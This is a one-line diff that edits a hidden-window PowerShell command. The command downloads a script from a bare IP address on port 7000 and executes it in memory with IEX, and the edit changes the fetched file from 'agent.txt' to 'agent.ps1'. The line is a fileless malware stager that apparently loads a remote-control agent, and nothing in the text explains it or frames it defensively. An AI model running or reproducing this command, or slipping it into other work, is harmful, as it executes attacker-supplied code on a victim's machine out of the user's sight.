@@ -1,1 +1,1 @@
-powershell -nop -w hidden -c "IEX(New-Object System.Net.WebClient).DownloadString('http://3.7.173.185:7000/agent.txt')"
+powershell -nop -w hidden -c "IEX(New-Object System.Net.WebClient).DownloadString('http://3.7.173.185:7000/agent.ps1')"
